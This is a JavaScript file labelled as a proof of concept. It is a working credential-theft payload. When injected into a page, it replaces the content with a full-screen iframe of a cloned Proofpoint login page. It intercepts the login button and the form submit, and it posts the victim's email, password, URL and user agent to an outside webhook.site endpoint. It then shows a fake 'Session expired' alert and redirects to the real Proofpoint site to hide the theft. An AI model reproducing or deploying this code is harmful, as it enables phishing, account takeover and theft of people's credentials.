// poc.js - Loads the cloned Proofpoint login page and steals credentials
(function() {
    // Prevent duplicate execution
    if (window.credentialTheftLoaded) return;
    window.credentialTheftLoaded = true;
    
    // Store original body content
    const originalBody = document.body.cloneNode(true);
    
    // Clear the page and load the fake login page
    document.body.innerHTML = '';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.style.overflow = 'auto';
    
    // Create an iframe to load your cloned login page
    const iframe = document.createElement('iframe');
    iframe.src = 'https://swathip888a.github.io/ATO/index.html';
    iframe.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
        z-index: 999999;
    `;
    document.body.appendChild(iframe);
    
    // Wait for iframe to load and inject credential stealer
    iframe.onload = function() {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            // Find the login form in the iframe
            // Your clone page has a login form - we need to intercept it
            const originalForm = iframeDoc.querySelector('form');
            const emailInput = iframeDoc.querySelector('input[type="email"], input[name="email"]');
            const passwordInput = iframeDoc.querySelector('input[type="password"]');
            const loginButton = iframeDoc.querySelector('button[type="submit"], .login-btn, input[type="submit"]');
            
            if (loginButton) {
                // Replace the login button click handler
                loginButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    // Get credentials
                    const email = emailInput ? emailInput.value : '';
                    const password = passwordInput ? passwordInput.value : '';
                    
                    // Send to your webhook
                    fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            userAgent: navigator.userAgent
                        })
                    });
                    
                    // Show fake loading then redirect to real site
                    alert('Session expired. Please login again.');
                    window.location.href = 'https://www.proofpoint.com/us';
                });
            }
            
            // Also intercept form submission
            if (originalForm) {
                originalForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const email = emailInput ? emailInput.value : '';
                    const password = passwordInput ? passwordInput.value : '';
                    
                    fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            userAgent: navigator.userAgent
                        })
                    });
                    
                    alert('Session expired. Please login again.');
                    window.location.href = 'https://www.proofpoint.com/us';
                });
            }
        } catch(e) {
            // Cross-origin issues - fallback: redirect to your clone page
            window.location.href = 'https://swathip888a.github.io/ATO/index.html?redirect=' + encodeURIComponent(window.location.href);
        }
    };
})();
